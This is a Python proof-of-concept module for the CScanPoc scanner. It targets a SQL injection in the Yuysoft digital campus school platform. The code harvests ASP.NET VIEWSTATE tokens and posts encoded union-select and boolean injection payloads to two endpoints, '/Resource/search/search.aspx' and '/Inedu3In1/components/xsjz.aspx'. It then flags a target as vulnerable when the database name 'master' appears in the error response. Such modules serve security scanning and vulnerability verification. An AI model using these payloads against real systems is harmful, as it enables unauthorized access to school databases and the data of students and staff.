# coding: utf-8

from CScanPoc.thirdparty import requests, hackhttp
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
import re
from urllib.parse import quote


class Vuln(ABVuln):
    vuln_id = 'Yuysoft_0008'  # 平台漏洞编号，留空
    name = '育友通用数字化校园平台 SQL注入'  # 漏洞名称
    level = VulnLevel.HIGH  # 漏洞危害级别
    type = VulnType.INJECTION  # 漏洞类型
    disclosure_date = '2015-04-02'  # 漏洞公布时间
    desc = '''
        育友通用数字化校园平台采用分布式权限管理，将整个信息平台的大量的信息维护任务，分配到各科室、个人，既调动了全体教师的使用热情，又可及时、高效的更新大量的信息。
        育友通用数字化校园平台 SQL注入漏洞：
        '/Resource/search/search.aspx',
        '/Inedu3In1/components/xsjz.aspx',
    '''  # 漏洞描述
    ref = 'https://bugs.shuimugan.com/bug/view?bug_no=105378、0105721'  # 漏洞来源
    cnvd_id = 'Unknown'  # cnvd漏洞编号
    cve_id = 'Unknown'  # cve编号
    product = '育友数字化校园平台'  # 漏洞应用名称
    product_version = 'Unknown'  # 漏洞应用版本


def findVIEWSTATE(url):
    hh = hackhttp.hackhttp()
    m_values = []
    code, head, res, errcode, _ = hh.http(url)
    m1 = re.search("__VIEWSTATE.*?value=\"(.*?)\"", res, re.S)
    m2 = re.search("__EVENTVALIDATION.*?value=\"(.*?)\"", res, re.S)
    if m1 and m2:
        m_values.append(m1.group(1))
        m_values.append(m2.group(1))
        return m_values
    else:
        return ['', '']


class Poc(ABPoc):
    poc_id = 'c60cf706-360e-4980-b421-48b387115285'
    author = '47bwy'  # POC编写者
    create_date = '2018-05-11'  # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())
        self.option_schema = {
            'properties': {
                'base_path': {
                    'type': 'string',
                    'description': '部署路径',
                    'default': '',
                    '$default_ref': {
                        'property': 'deploy_path'
                    }
                }
            }
        }

    def verify(self):
        self.target = self.target.rstrip(
            '/') + '/' + (self.get_option('base_path').lstrip('/'))
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))

            hh = hackhttp.hackhttp()
            payloads = [
                '/Resource/search/search.aspx',
                '/Inedu3In1/components/xsjz.aspx',
            ]
            postdatas = {
                payloads[0]: '&Title=1%27%20union%20all%20select%20db_name%281%29%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull--&username=&KeyWord=&sDate=&eDate=&btnsearch=&__EVENTVALIDATION=',
                payloads[1]: '&__EVENTTARGET=&__EVENTARGUMENT=&__LASTFOCUS=&classid=0&TB_Search=1%27%20and%20db_name%281%29%3E1--&IB_Search.x=4&IB_Search.y=13&__EVENTVALIDATION='
            }
            for payload in payloads:
                url = self.target + payload
                viewstate_value = findVIEWSTATE(url)
                postdata = '__VIEWSTATE=' + \
                    quote(viewstate_value[0]) + \
                    postdatas[payload] + quote(viewstate_value[1])
                code, head, res, errcode, _ = hh.http(url, postdata)
                if code == 500 and 'master' in res:
                    # security_hole(arg+payload)
                    print(url)

        except Exception as e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        self.verify()


if __name__ == '__main__':
    Poc().run()
